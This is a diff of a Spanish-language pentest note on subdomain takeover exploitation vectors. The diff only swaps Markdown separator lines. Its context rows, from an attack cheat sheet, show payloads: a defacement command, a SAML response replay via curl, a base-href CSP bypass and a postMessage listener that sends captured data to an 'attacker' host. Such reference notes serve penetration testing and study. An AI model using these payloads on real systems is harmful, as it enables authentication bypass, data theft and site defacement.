@@ -18,7 +18,7 @@ linked:
 ---
 # Subdomain Takeover - Vectores de Explotación
 
-***
+---
 
 ## Phishing con Subdomain Legítimo
 
@@ -33,7 +33,7 @@ linked:
 | Defacement: `echo "<h1>Owned</h1>" > /var/www/index.html` | PR / brand damage PoC | Demonstration. |
 ^sdt-vector-phishing
 
-___
+---
 
 ## Cookie Scope Abuse (Domain=`.target.com`)
 
@@ -63,7 +63,7 @@ ___
 </script>
 ```
 
-___
+---
 
 ## OAuth `redirect_uri` Trust Transfer
 
@@ -77,7 +77,7 @@ ___
 | Setup mobile redirect: `intent://taken.target.com/cb#Intent;scheme=https;...` | Mobile OAuth flow takeover | Mobile chain. |
 ^sdt-vector-oauth
 
-___
+---
 
 ## CSP Subdomain Bypass
 
@@ -92,7 +92,7 @@ ___
 | `<base href="https://taken.target.com/">` (HTML injection) | base-uri hijack | Path-relative URL abuse. |
 ^sdt-vector-csp
 
-___
+---
 
 ## SAML SP / IdP Trust
 
@@ -106,7 +106,7 @@ ___
 | Replay SAML response con `curl -X POST -d "SAMLResponse=$CAPTURED" https://victim/sp/saml` | SAML replay post-capture | Auth bypass. |
 ^sdt-vector-saml
 
-___
+---
 
 ## CORS Allowlist Abuse
 
@@ -120,4 +120,4 @@ ___
 | `<script>window.addEventListener('message', e => fetch('//attacker?'+JSON.stringify(e.data))); window.parent.postMessage('test','*');</script>` | postMessage bypass via Origin trust | Cross-window. |
 ^sdt-vector-cors
 
-***
+---
